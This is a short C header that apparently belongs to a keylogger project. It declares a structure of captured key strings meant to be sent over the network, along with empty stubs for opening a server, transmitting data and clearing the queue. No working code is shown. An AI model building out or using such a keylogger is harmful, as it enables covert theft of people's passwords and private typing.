#pragma once
#include "keylogger.h"

/**
 * Represents all the data that is sent over the network
 */
typedef struct {
  char** keys;  // an array of strings to be sent over the network
} key_package;

/**
 * Documentation here
 */
void open_server(void);

/**
 * Documentation here
 */
void transmit_data(void);

/**
 * Documentation here
 */
void clear_data_queue(void);

/**
 * Documentation here
 */
void close_server(void);
